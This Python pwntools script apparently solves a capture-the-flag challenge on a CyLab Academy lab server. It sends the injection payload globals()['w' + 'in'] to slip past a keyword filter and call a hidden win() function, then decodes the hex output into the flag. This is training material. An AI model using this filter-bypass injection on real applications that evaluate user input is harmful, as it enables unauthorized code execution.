#!/usr/bin/env python3
from pwn import *
import re


context.log_level = 'info'

HOST = 'chatelaine.cylabacademy.net'
PORT = 32601

def main():
    try:
        log.info(f"Connecting to remote target {HOST}:{PORT}...")
        p = remote(HOST, PORT)
        
        # 1. Wait for the menu prompt '==> '
        log.info("Waiting for the application input prompt...")
        p.recvuntil(b'==> ')
        
        # 2. Send the dynamic function injection payload to bypass the string filter
        # This executes win() without explicitly typing the forbidden string 'win'
        payload = b"globals()['w' + 'in']"
        log.info(f"Sending filter bypass payload: {payload.decode()}")
        p.sendline(payload)
        
        # 3. Read the output from the server containing the hex codes
        log.info("Receiving response from target...")
        response = p.recvall(timeout=5)
        
        
        raw_output = response.decode('utf-8', errors='ignore')
        log.debug(f"Raw output from server:\n{raw_output}")
        
        # 4. Automatically extract all hex tokens (e.g., 0x70, 0x69) using Regex
        # This handles changes in delimiters, newlines, or formatting smoothly
        hex_tokens = re.findall(r'0x[0-9a-fA-F]+', raw_output)
        
        if not hex_tokens:
            log.error("Failed to detect any hex patterns in the server response!")
            return
            
        log.info(f"Successfully extracted {len(hex_tokens)} hex values dynamically.")
        
        
        flag_characters = []
        for token in hex_tokens:
            char_code = int(token, 16)
            flag_characters.append(chr(char_code))
            
        final_flag = "".join(flag_characters)
        
        
        print("\n" + "=" * 60)
        print(f"[+] DYNAMIC FLAG CAPTURED: {final_flag}")
        print("=" * 60 + "\n")
        
    except Exception as e:
        log.exception(f"An error occurred during exploit execution: {e}")

if __name__ == '__main__':
    main()
